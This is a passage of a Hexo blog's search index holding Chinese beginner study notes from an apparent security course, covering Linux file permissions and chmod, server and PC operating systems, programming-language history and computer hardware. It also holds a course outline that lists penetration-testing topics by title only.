(类似Windows的快捷方式)</td></tr><tr><td>b</td><td>块设备文件(例如硬盘、光驱等)</td></tr><tr><td>p</td><td>管道文件</td></tr><tr><td>c</td><td>字符设备文件(例如屏幕等串口设备)</td></tr><tr><td>s</td><td>套接口文</td></tr></tbody></table><p><a name="dS2Lv"></a></p><h3 id="用户类别"><a href="#用户类别" class="headerlink" title="用户类别"></a>用户类别</h3><blockquote><p>rw- — —<br>rwx r-x r-x</p></blockquote><table><thead><tr><th>符号</th><th>单词</th><th>含义</th></tr></thead><tbody><tr><td>u</td><td>user</td><td>所属用户(的权限)</td></tr><tr><td>g</td><td>group</td><td>所属组别(的权限)</td></tr><tr><td>o</td><td>other</td><td>其他用户(的权限)</td></tr></tbody></table><p><a name="OBJYN"></a></p><h3 id="权限类别"><a href="#权限类别" class="headerlink" title="权限类别"></a>权限类别</h3><blockquote><p>rw- — —<br>rwx r-x r-x</p></blockquote><table><thead><tr><th>符号</th><th>单词</th><th>含义</th><th>对于文件</th><th>对于目录</th></tr></thead><tbody><tr><td>r</td><td>read</td><td>可读</td><td>可以读取</td><td>可以浏览内容</td></tr><tr><td>w</td><td>write</td><td>可写</td><td>可以修改</td><td>可以删除、移动内容</td></tr><tr><td>x</td><td>execute</td><td>可执行</td><td>可以执行</td><td>可以进入目录</td></tr><tr><td>-</td><td></td><td>没有权限</td><td></td><td></td></tr></tbody></table><p><a name="PVtTS"></a></p><h3 id="权限类别-1"><a href="#权限类别-1" class="headerlink" title="权限类别"></a>权限类别</h3><p><img src="/../../../../assets/lw42v2iewcwx3u9y_gryd5v/1668393003649-1238fd56-fb4c-4253-9bed-f2da11d28f8b.png" alt="image.png"></p><blockquote><p>d rwx rwx r-x. 2 alan security 6 Jul 7 06:08 test<br>775<br>7=4+2+1<br>5=4+1</p></blockquote><p>例如：</p><table><thead><tr><th>数值</th><th>权限</th><th>拆开3段，每3位</th><th>计算</th></tr></thead><tbody><tr><td>444</td><td>r– r– r–</td><td>r–和r–和r–</td><td>4+0+0=4，所以444</td></tr><tr><td>600</td><td>rw- — —</td><td>rw-和—和—</td><td>rw-等于4+2=6, — 等于0, 所以是600</td></tr><tr><td>644</td><td>rw- r– r–</td><td>rw-和r–和r–</td><td>rw-等于4+2=6，r–等于4，所以是644</td></tr><tr><td>666</td><td>rw- rw- rw-</td><td>rw-和rw-和rw-</td><td>rw-等于4+2=6,所以是666</td></tr><tr><td>700</td><td>rwx — —</td><td>rwx和—和—</td><td>rwx等于4+2+1=7，—等于0，所以是700</td></tr><tr><td>744</td><td>rwx r– r–</td><td>rwx和r–和r–</td><td>rwx等于4+2+1=7，r–等于4,所以是744</td></tr><tr><td>755</td><td>rwx r-x r-x</td><td>rwx和r-x和r-x</td><td>rwx等于4+2+1=7，r-x等于4+1=5. 所以是755</td></tr><tr><td>777</td><td>rwx rwx rwx</td><td>rwx和rwx和rwx</td><td>rwx等于4+2+1=7，所以是777</td></tr></tbody></table><p><a name="Nb53d"></a></p><h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><p>#添加组用户的写权限。全拼: change mode<br><code>chmod g+w test.log</code><br>#删除其他用户的所有权限。<br><code>chmod o= test.log</code><br>#使得所有用户都没有写权限。<br><code>chmod a-w test.log</code><br>#当前用户具有所有权限，组用户有读写权限，其他用户只有读权限。<br><code>chmod u=rwx, g=rw, o=r test.log</code><br>#等价的八进制数表示:<br><code>chmod 764 test.log</code><br>#将目录以及目录下的文件都设置为所有用户拥有读写权限。<br>#注意,使用’-R’选项一定要保留当前用户的执行和读取权限，否则会报错!<br><code>chmod -R a=rw testdir/</code><br>#根据其他文件的权限设置文件权限。<br><code>chmod --reference=1.log test.log</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时9-1.6-为什么要学习Linux</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-9-1.6-wei-shi-me-yao-xue-xi-linux/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-9-1.6-wei-shi-me-yao-xue-xi-linux/</url>
      
        <content type="html"><![CDATA[<p><a name="EaU9x"></a></p><h1 id="为什么要学习Linux"><a href="#为什么要学习Linux" class="headerlink" title="为什么要学习Linux?"></a>为什么要学习Linux?</h1><p>1、使用网络的程序，都有一个服务器;<br>2、服务器，大部分使用的是Linux操作系统。 <a name="EUM1M"></a></p><h1 id="学习方法"><a href="#学习方法" class="headerlink" title="学习方法"></a>学习方法</h1><p>1、先学习重点<br>2、分门门别类地学<br>3、不要强行记命令</p><pre><code>cd change directorypwd print working directoryrm removecp copy-f force 强制-v verbose详细-r recursive递归     reverse倒序-i inquir询问</code></pre><p>4、多用，自然熟练</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时8-1.5-服务器操作系统</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-8-1.5-fu-wu-qi-cao-zuo-xi-tong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-8-1.5-fu-wu-qi-cao-zuo-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><a name="Mwsud"></a></p><h1 id="客户端和服务端"><a href="#客户端和服务端" class="headerlink" title="客户端和服务端"></a>客户端和服务端</h1><p>客户端Client：软件/网页<br>网络<br>服务器Server</p><p><a name="Duyeb"></a></p><h1 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h1><p>C/S架构: Client/Server</p><ul><li>客户端:迅雷、QQ、百度网盘、腾讯课堂、网易云音乐、游戏客户端、腾讯视频……</li><li>特点:需要安装和升级，占用资源多，性能高</li><li></li></ul><p>B/S架构: Browser/Server</p><ul><li>浏览器: Chrome、FireFox、 Edge、 360…..</li><li>站点:百度、知乎、微博贴吧、淘宝……</li><li>特点:不用安装维护，跨操作系统，占用资源低</li></ul><p><a name="QaDmM"></a></p><h1 id="服务器的组成部分"><a href="#服务器的组成部分" class="headerlink" title="服务器的组成部分"></a>服务器的组成部分</h1><p><a name="RCZky"></a></p><h2 id="服务器硬件"><a href="#服务器硬件" class="headerlink" title="服务器硬件"></a>服务器硬件</h2><p><a name="mLOFz"></a></p><h2 id="服务器操作系统"><a href="#服务器操作系统" class="headerlink" title="服务器操作系统"></a>服务器操作系统</h2><p>Windows Server系列<br>Linux系列: Redhat、CentOS、 Debian、 Ubuntu<br>Unix系列: SUN Solaris、BSD Unix <a name="w0auc"></a></p><h2 id="HTTP容器-Web服务器"><a href="#HTTP容器-Web服务器" class="headerlink" title="HTTP容器(Web服务器)"></a>HTTP容器(Web服务器)</h2><p>Tomcat、Apache、 Nginx、 Weblogic、 JBoss..</p><p><a name="FZCsq"></a></p><h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>各种编程语言开发的软件项目: Java、 PHP、C、<br>Python、Ruby、 Go……</p><p><a name="Bvmub"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>应用程序                   &amp;#x20;<br>HTTP容器                   数据库<br>服务器操作系统          服务器操作系统<br>服务器硬件                 服务器硬件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时7-1.4-个人电脑操作系统</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-7-1.4-ge-ren-dian-nao-cao-zuo-xi-tong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-7-1.4-ge-ren-dian-nao-cao-zuo-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><a name="iwxZD"></a></p><h1 id="计算机和个人电脑"><a href="#计算机和个人电脑" class="headerlink" title="计算机和个人电脑"></a>计算机和个人电脑</h1><p>1946年:计算机发明<br>20世纪90年代:个人电脑(PC)流行</p><p><a name="rQ5d0"></a></p><h1 id="计算机发展"><a href="#计算机发展" class="headerlink" title="计算机发展"></a>计算机发展</h1><p>微软DOS<br>Windows 95<br>Windows XP<br>Windows 7<br>Windows 10</p><p><a name="Y0W49"></a></p><h1 id="国产操作系统"><a href="#国产操作系统" class="headerlink" title="国产操作系统"></a>国产操作系统</h1><table><thead><tr><th>名称</th><th>公司</th></tr></thead><tbody><tr><td>中标棋麟</td><td>中标软件有限公司</td></tr><tr><td>中兴新支点</td><td>广东中兴新支点技术有限公司</td></tr><tr><td>中科方德</td><td>中科方德软件有限公司</td></tr><tr><td>优麒麟</td><td>中国CCN联合实验室</td></tr><tr><td>银河麒麟</td><td>天津热聚信息技术有限公司</td></tr><tr><td>一铭Linux</td><td>一铭软件股份有限公司</td></tr><tr><td>深度Linux</td><td>武汉深之度科技有限公司</td></tr><tr><td>StartOS</td><td>东莞瓦力网络科技有限公司</td></tr><tr><td>凝思Linux</td><td>北京凝思软件股份有限公司</td></tr><tr><td>COS操作系统</td><td>上海联彤网络通讯技术有限上司</td></tr><tr><td>思普操作系统</td><td>云南思普投资有限公司</td></tr><tr><td>华为鸿蒙系统</td><td>华为技术有限公司</td></tr></tbody></table><p><a name="dD6pW"></a></p><h1 id="其他操作系统"><a href="#其他操作系统" class="headerlink" title="其他操作系统"></a>其他操作系统</h1><p>Apple: MacOS<br>其他设备: ATM、POS、汽车、智能音箱、航天飞船…..</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时6-1.3.2-程序运行原理-编程语言</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-6-1.3.2-cheng-xu-yun-xing-yuan-li-bian-cheng-yu-yan/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-6-1.3.2-cheng-xu-yun-xing-yuan-li-bian-cheng-yu-yan/</url>
      
        <content type="html"><![CDATA[<p><a name="cKSgq"></a></p><h1 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h1><p><a name="g3Bys"></a></p><h2 id="第一代语言："><a href="#第一代语言：" class="headerlink" title="第一代语言："></a>第一代语言：</h2><p>机器语言:二进制代码语言<br>01000000101 <a name="DIpzv"></a></p><h2 id="第二代语言："><a href="#第二代语言：" class="headerlink" title="第二代语言："></a>第二代语言：</h2><p>汇编语言:用英文字母或符号串来替代操作<br>LOAD A<br>ADD B<br>STORE C <a name="nmm2t"></a></p><h2 id="第三代语言："><a href="#第三代语言：" class="headerlink" title="第三代语言："></a>第三代语言：</h2><p>面向过程语言：Fortran，Basic，C，Pascal<br>面向对象语言：SmallTalk，EIFFEL，Ada，C++，c#，python，Java，golang<br>高级编程语言是面向过程和面向对象语言。贴近自然语言，不直接操作硬件，可移植<br>C= A+ B;</p><p><a name="qM5HH"></a></p><h1 id="从源代码到可执行程序"><a href="#从源代码到可执行程序" class="headerlink" title="从源代码到可执行程序"></a>从源代码到可执行程序</h1><p>源程序→编译器→汇编语言程序→汇编器→机器代码→链接器，加载器→目标机器代码</p><p><a name="Mqw1A"></a></p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p><a name="XnNQI"></a></p><h2 id="为什么需要操作系统-Operating-System"><a href="#为什么需要操作系统-Operating-System" class="headerlink" title="为什么需要操作系统(Operating System) ?"></a>为什么需要操作系统(Operating System) ?</h2><p>1、提供API,屏蔽硬件差异<br>2、协调系统资源</p><p><a name="j7D5D"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>计算机应用程序<br>操作系统，编译原理，计算机网络<br>计算机体系结构<br>CPU/GPU，内存/硬盘，显示器/键盘</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时5-1.3.1-程序运行原理-二进制</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-5-1.3.1-cheng-xu-yun-xing-yuan-li-er-jin-zhi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-5-1.3.1-cheng-xu-yun-xing-yuan-li-er-jin-zhi/</url>
      
        <content type="html"><![CDATA[<p><a name="LML5z"></a></p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><a name="SBB88"></a></p><h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p><a name="NsoDV"></a></p><h2 id="为什么说计算机只认识0和1"><a href="#为什么说计算机只认识0和1" class="headerlink" title="为什么说计算机只认识0和1?"></a>为什么说计算机只认识0和1?</h2><p>电路状态。 <a name="UhUdT"></a></p><h2 id="有其他进制的计算机吗"><a href="#有其他进制的计算机吗" class="headerlink" title="有其他进制的计算机吗?"></a>有其他进制的计算机吗?</h2><p>九章计算机：三进制</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时4-1.2.3-计算机硬件组成-硬盘</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-4-1.2.3-ji-suan-ji-ying-jian-zu-cheng-ying-pan/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-4-1.2.3-ji-suan-ji-ying-jian-zu-cheng-ying-pan/</url>
      
        <content type="html"><![CDATA[<p><a name="CYR4n"></a></p><h1 id="硬盘类型"><a href="#硬盘类型" class="headerlink" title="硬盘类型"></a>硬盘类型</h1><p>机械硬盘<br>固态硬盘</p><p><a name="m8QnV"></a></p><h1 id="机械硬盘和固态硬盘工作原理"><a href="#机械硬盘和固态硬盘工作原理" class="headerlink" title="机械硬盘和固态硬盘工作原理"></a>机械硬盘和固态硬盘工作原理</h1><p>机械硬盘HDD3.5”<br>盘片，主轴，读写磁头，磁头臂，音圈点机，永磁铁</p><p>固态硬盘SSD2.5<br>缓存，NAND闪存，主控</p><p><a name="BIHTX"></a></p><h1 id="硬盘-外存"><a href="#硬盘-外存" class="headerlink" title="硬盘:外存"></a>硬盘:外存</h1><p>硬盘和内存的区别:<br>1、读写速度<br>2、作用<br>3、持久存储</p><p><a name="lHv6L"></a></p><h1 id="输入输出设备"><a href="#输入输出设备" class="headerlink" title="输入输出设备"></a>输入输出设备</h1><p>输入设备:键盘、鼠标、麦克风、摄像头、扫描仪、数位板、游戏手柄等等;<br>输出设备:显示器、打印机、音响等等。</p><p>显卡(GPU)<br>声卡</p><p><a name="PJFOK"></a></p><h1 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h1><p><img src="/../../../../assets/ayxmuuq5wid3qlc7_fkuogd/1668214884531-74605f47-155b-487a-a385-cb812a0d5f8d.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-1.2.2-计算机硬件组成-内存</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-3-1.2.2-ji-suan-ji-ying-jian-zu-cheng-nei-cun/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-3-1.2.2-ji-suan-ji-ying-jian-zu-cheng-nei-cun/</url>
      
        <content type="html"><![CDATA[<p><a name="YZNUX"></a></p><h1 id="内存-主存"><a href="#内存-主存" class="headerlink" title="内存(主存)"></a>内存(主存)</h1><p><img src="/../../../../assets/hv722kr5zyem670u_ffk1gw/1668214344172-27c6245e-383c-40eb-bf14-ae18688a9bc6.png" alt="image.png"> <a name="tiXBE"></a></p><h1 id="内存与存储空间"><a href="#内存与存储空间" class="headerlink" title="内存与存储空间"></a>内存与存储空间</h1><p>运行内存: RAM (Random Access Memory)<br>存储空间: ROM (Read Only Memory)</p><p><a name="PfqND"></a></p><h1 id="内存的工作频率"><a href="#内存的工作频率" class="headerlink" title="内存的工作频率"></a>内存的工作频率</h1><p>SDRAM: 100 133 166 200<br>DDR: 200 266 333 400<br>DDR2: 400 533 667 800 1066<br>DDR3: 800 1066 1333 1600 1866 2133<br>DDR4: 2133 2400 2666 3200<br>DDR5: 4800 5200 5600<br>….</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-1.2.1-计算机硬件组成-CPU</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-2-1.2.1-ji-suan-ji-ying-jian-zu-cheng-cpu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-2-1.2.1-ji-suan-ji-ying-jian-zu-cheng-cpu/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>计算机应用程序</th><th></th><th></th></tr></thead><tbody><tr><td>操作系统</td><td>编译原理</td><td></td></tr><tr><td>计算机网络</td><td></td><td></td></tr><tr><td>计算机体系结构</td><td></td><td></td></tr><tr><td>CPU/GPU</td><td>内存/硬盘</td><td>显示器/键盘</td></tr></tbody></table><p><a name="wnxoy"></a></p><h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>Central Processing Unit (中央处理器/处理器)</p><p>常见的电脑处理器:&amp;#x20;<br>Intel奔腾8086、酷睿i5 i7 i9; AMD锐龙</p><p>常见的手机处理器:高通骁龙系列、苹果A系列、海思<br>麒麟系列、联发科天玑系列</p><p><a name="QLaft"></a></p><h2 id="CPU的本质"><a href="#CPU的本质" class="headerlink" title="CPU的本质"></a>CPU的本质</h2><pre><code>             控制单元&lt;br /&gt;            ↓   控制指令      ↓&lt;br /&gt;存储单元&lt;=数据=&gt;运算单元</code></pre><p>控制单元(Control Unit):完成数据处理整个过程中的调配工作;<br>算术逻辑单元ALU(Arithmetic Logic Unit):完成各个指令以便得到程序最终想要的结果;<br>存储单元:负责存储原始数据以及运算结果。</p><p><a name="qGpu2"></a></p><h2 id="芯片和CPU的关系"><a href="#芯片和CPU的关系" class="headerlink" title="芯片和CPU的关系"></a>芯片和CPU的关系</h2><p>芯片有很多种，CPU芯片是其中- -种<br>其他还有GPU、NPU、FPGA芯片等等</p><p>GPU: Graphic Processing Unit图形处理单元<br>NPU: Neural Networks Process Units神经网络处理单元<br>FGCA: Field-Programmable Gate Array现场可编程门</p><p><a name="uRnIL"></a></p><h2 id="CPU和GPU的区别"><a href="#CPU和GPU的区别" class="headerlink" title="CPU和GPU的区别"></a>CPU和GPU的区别</h2><p>CPU<br>控制器 Control<br>运算器ALU<br>高速缓存Cache<br>主存贮器DRAM</p><p>GPU<br>treaming-multiprocessors (SMs)<br>主存贮器DRAM<br><a href="https://www.vipc9.com/"></a> <a name="OTkmS"></a></p><h2 id="CPU重要参数"><a href="#CPU重要参数" class="headerlink" title="CPU重要参数"></a>CPU重要参数</h2><ul><li>核心数:物理核心数</li><li>线程:超线程技术，逻辑处理器</li><li>频率:工作频率，1秒钟产生的脉冲信号</li><li>32位和64位: CPU一次能处理的位数</li></ul><p><a name="c0bqe"></a></p><h2 id="CPU指令集和架构"><a href="#CPU指令集和架构" class="headerlink" title="CPU指令集和架构"></a>CPU指令集和架构</h2><ul><li>指令是用来控制硬件的，经过编译后: 01010101的电信号</li><li>复杂指令集(Complex Instruction Set Computer) :</li></ul><p>每个指令做复杂动作，完成操作需要较少指令，庞大</p><ul><li><p>代表: Intel X86</p></li><li></li><li><p>精简指令集(Reduced Instruction Set Computer) :</p></li></ul><p>每个指令做简单动作，完成操作需要很多指令,灵活</p><ul><li>代表: ARM、RISC-V、 MIPS</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-1.1-计算机发展历史</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-1-1.1-ji-suan-ji-fa-zhan-li-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-1-bu-fen-ji-chu-yu-zhun-bei/2-linux-cao-zuo-xi-tong/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-1-1.1-ji-suan-ji-fa-zhan-li-shi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习目录</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/xue-xi-mu-lu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/xue-xi-mu-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-基础与准备"><a href="#第一部分-基础与准备" class="headerlink" title="第一部分:基础与准备"></a>第一部分:基础与准备</h1><ol><li>中华人民共和国网络安全法</li><li>Linux操作系统</li><li>计算机网络基础</li><li>HTML(网安)</li><li>PHP入门</li><li>MySQL</li><li>Python编程</li></ol><h1 id="第二部分-渗透与攻防"><a href="#第二部分-渗透与攻防" class="headerlink" title="第二部分:渗透与攻防"></a>第二部分:渗透与攻防</h1><ol><li>信息收集</li><li>SQL注入的渗透与防御</li><li>XSS相关渗透与防御</li><li>CSRF渗透与防御</li><li>文件上传漏洞渗透与防御</li><li>文件包含渗透与防御</li><li>SSRF渗透与防御</li><li>XXE渗透与防御</li><li>远程代码执行渗透与防御</li><li>密码暴力猜解与防御（x）</li><li>逻辑相关渗透与防御（x）</li><li>Redis未授权访问漏洞</li><li>反序列化渗透与防御</li><li>AWVS漏洞扫描</li><li>Appscan漏洞扫描</li><li>Nessus漏洞扫描</li><li>MSF+Cobalt Strike</li><li>Burp Suite从入门到实战</li><li>ARP渗透与防御</li><li>DOS与DDOS渗透与防御</li><li>操作系统权限提升渗透与防御</li><li>内网相关渗透与防御</li><li>无线相关渗透与防御</li><li>社会工程学</li><li>木马免杀问题与防御</li><li>渗透报告编写</li><li>CVE漏洞复现</li><li>最新Kali高级渗透测试</li><li>vulnhub靶场实战系列</li><li>挖漏洞项目实战</li><li>【完整回放】2022 HVV实战专题</li><li>2022HVV特训营</li><li>Windows逆向安全进阶版</li><li>免杀-反杀毒技术</li><li>Android逆向</li><li>网络安全VIP直播课</li><li>实战漏洞挖掘经验分享</li><li>溯源</li></ol><h1 id="第三部分-安全管理"><a href="#第三部分-安全管理" class="headerlink" title="第三部分:安全管理"></a>第三部分:安全管理</h1><ol><li>等级保护</li><li>风险评估</li><li>应急响应</li><li>代码审计</li><li>数据安全</li><li>云安全技术</li><li>网络安全就业面试指导课</li></ol><h1 id="第四部分-DevOps"><a href="#第四部分-DevOps" class="headerlink" title="第四部分:DevOps"></a>第四部分:DevOps</h1><ol><li>Nginx基础应用实战</li><li>DevOps必备之Git持续集成工具</li><li>DevOps必备Tomcat代码上线流程</li><li>DevOps必备之Jenkins持续部署工具</li><li>容器管理工具 Docker</li><li>Kubernetes实战进阶课程</li><li>kubernetes实战与源码剖析</li><li>Prometheus-基础入门到源码剖析</li></ol><h1 id="第五部分-进阶提升"><a href="#第五部分-进阶提升" class="headerlink" title="第五部分:进阶提升"></a>第五部分:进阶提升</h1><ol><li>JavaScript入门(网安)</li><li>Web Js逆向</li><li>网络安全与密码学</li><li>HTML5+CSS3零基础到实战</li><li>Shell编程</li><li>汇编语言程序设计</li><li>C语言编程入门</li><li>C++编程入门</li><li>JavaSE初阶</li><li>IDE集成开发工具-IDEA</li><li>JavaSE中阶</li><li>JavaSE进阶实战</li><li>Golang语法精讲</li><li>CTF-Web题型</li><li>CTF-Crypto题型</li></ol><h1 id="第六部分：1-0备份课程"><a href="#第六部分：1-0备份课程" class="headerlink" title="第六部分：1.0备份课程"></a>第六部分：1.0备份课程</h1><ol><li>计算机网络基础PRO</li><li>Linux操作系统(网安)</li><li>渗透测试网站开发后端技术PHP快速入门</li><li>渗透测试网站开发前端技术HTML快速入门</li><li>Python运维自动化课程</li><li>HTML / CSS </li><li>javaScript 入门与程序设计</li><li>SQL注入的渗透与防御（备份）</li><li>Docker进阶课程</li><li>安全巡检</li><li>PHP零基础入门到实战</li><li>PHP零基础入门到实战-(网安)</li></ol>]]></content>
      
      
      <categories>
          
          <category> 目录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/24/hello-world/"/>
      <url>/2022/12/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
